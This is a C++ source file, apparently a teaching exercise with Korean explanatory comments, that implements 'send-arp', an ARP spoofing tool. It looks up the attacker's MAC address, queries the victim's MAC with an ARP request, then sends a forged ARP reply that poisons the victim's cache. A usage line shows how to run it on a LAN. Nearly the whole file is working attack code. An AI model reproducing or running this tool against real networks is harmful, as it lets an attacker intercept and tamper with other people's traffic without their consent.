#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/ioctl.h>

#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

// 네트워크 인터페이스에 연결된 장치의 mac 주소를 반환하는 함수
std::string getMACAddress(const char* interface) {
    struct sockaddr_in *addr;
    struct ifreq ifr;

    // int socket(int domain, int type, int protocol): 소켓 생성 함수 
    // domain: 소켓의 도메인 지정. AF_INET은 IPv4를 사용하는 소켓을 생성한다.
    // type: 소켓의 유형을 지정한다. SOCK_DGRAM은 데이터그램 소켓을 생성함을 의미한다. 데이터그램 소켓은 UDP 통신에 사용된다.
    // protocol: 프로토콜을 지정한다. 보통 0으로 설정해 시스템이 적절한 프로토콜을 선택하도록 한다.
    // 반환값은 소켓 디스크립터이다. 이는 소켓을 식별할 때 사용된다. 소켓 생성에 실패할 시 -1을 반환한다. 
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");    // 소켓 생성 실패시 오류 메시지 출력
        exit(1);
    }

    // 네트워크 인터페이스 정보 설정
    // ifr.ifr_name: struct ifreq 구조체의 멤버로, 네트워크 인터페이스의 이름을 나타낸다.
    // interface: 인터페이스의 이름 함수의 매개변수로 전달 받는다.
    // IFNAMSIZ: 인터페이스 이름의 최대 길이를 나타내는 상수이다.
    // char* strncpy(char* dest, const char* src, size_t n): 문자열을 복사하는 함수 중 하나이다.
    // 이 함수는 원본 문자열로부터 지정된 길이까지 문자열을 복사해 대상 버퍼에 저장한다.
    // dest: 복사될 문자열이 저장될 대성 버퍼의 포인터
    // src: 원본 문자열의 포인터
    // n: 복사할 최대 문자 수를 나타내는 크기 제한
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    // 네트워크 인터페이스 MAC주소 가져오기
    // int ioctl(int fd, unsigned long request, ...): UNIX 계열 운영체제에서 장치에 대한 제어 연산을 수행하는 함수이다. 주로 특정 장치의 상태를 읽거나 설정하는데 사용된다.
    // fd: 제어 연산을 수행할 파일 디스크립터이다.
    // requst: 수행할 제어 요청을 나타내는 매크로 또는 제어 코드이다. 수행하려는 특정 제어 연산을 지정한다.
    // ...: 제어 요청에 필요한 추가적인 인수들이다. 제어 요청에 따라 다를 수 있다.
    // sock: 소켓 디스크립터를 나타낸다
    // SIOCGIFHWADDR: 이 매크로는 네트워크 인터페이스의 하드웨어(MAC) 주소를 가져오는 제어 연산을 수행하는데 사용된다.
    // &ifr: struct ifreq 구조체의 포인터이다. 이 구조체는 네트워크 인터페이스에 대한 정보를 담고 있다.
    // ioctl 함수는 제어 연산이 성공하면 0, 실패하면 -1을 반환한다.
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        exit(1);
    }

    close(sock);

    // MAC 주소를 문자열로 변환
    // MAC 주소를 저장할 문자열을 선언. 각 바이트가 2개의 문자(16진수)로 표현되고, 콜론(:)이 5개 사용되므로 17, 마지막에 NULL 문자를 추가할 것이기 때문에 1을 더해 18이다.
    char macAddrStr[18];
    // sprintf() 함수를 사용해 macAddrStr에 형식화된 문자열을 저장한다. %02x는 각 바이트를 2자리의 16진수로 표시하되, 한자리일 경우 앞을 0으로 채운다. 콜론은 각 바이트 사이에 추가해준다.
    sprintf(macAddrStr, "%02X:%02X:%02X:%02X:%02X:%02X",
            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);
    
    // EthArpPacket 구조체의 MAC 자료형이 std::string이므로 mac의 자료형을 통일시키기 위해 다음과 같이 형변환
    return std::string(macAddrStr);
}

std::string arp_request(char* victim_ip, char* attacker_ip, std::string attacker_mac, pcap_t* handle) {
    EthArpPacket packet;
    //request => sender = attacker, target = victim
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // Broadcast MAC address
    packet.eth_.smac_ = Mac(attacker_mac.c_str()); // Attacker's MAC address
    packet.eth_.type_ = htons(EthHdr::Arp);
    
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(attacker_mac.c_str()); // Sender's MAC address
    packet.arp_.sip_ = htonl(Ip(attacker_ip)); // Sender's IP address
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Victim's MAC address (Unknown)
    packet.arp_.tip_ = htonl(Ip(victim_ip)); // Target's IP address (Supplied as argument)
    
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) 
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        
        memcpy(&packet, recv_packet, sizeof(EthArpPacket));
        if (packet.eth_.type_ != htons(EthHdr::Arp)) continue;
        if ((uint32_t)packet.arp_.sip_ == htonl(Ip(victim_ip))) {
            //printf("Victim MAC = %s\n", std::string(packet.arp_.smac_).c_str());
            break;
        }
    }
    
    return std::string(packet.arp_.smac_);
}

void arp_reply(char* victim_ip, char* attacker_ip, std::string victim_mac, std::string attacker_mac, pcap_t* handle) {
    EthArpPacket packet;
    //reply => sender = victim, target = attacker
    packet.eth_.dmac_ = Mac(victim_mac.c_str());
    packet.eth_.smac_ = Mac(attacker_mac.c_str()); // Attacker's MAC address
    packet.eth_.type_ = htons(EthHdr::Arp);
    
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(victim_mac.c_str()); // Sender's MAC address
    packet.arp_.sip_ = htonl(Ip(victim_ip)); // Sender's IP address
    packet.arp_.tmac_ = Mac(attacker_mac.c_str()); // Victim's MAC address
    packet.arp_.tip_ = htonl(Ip(attacker_ip)); // Target's IP address (Supplied as argument)
    
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) 
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

void usage() {
    printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if ((argc < 4) && (argc % 2 != 0)) {
        usage();
        return -1;
    }
    
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    const char* interface = argv[1];
    for (int i=2; i<argc; i+=2) {
        std::string attacker_mac = getMACAddress(interface);
        printf("Attacker MAC = %s\n", attacker_mac.c_str());
        
        std::string victim_mac = arp_request(argv[i], argv[i+1], attacker_mac, handle);
        printf("Victim MAC = %s\n", victim_mac.c_str());
        
        arp_reply(argv[i], argv[i+1], victim_mac, attacker_mac, handle);
    }
    
    pcap_close(handle);
    printf("done\n");
}
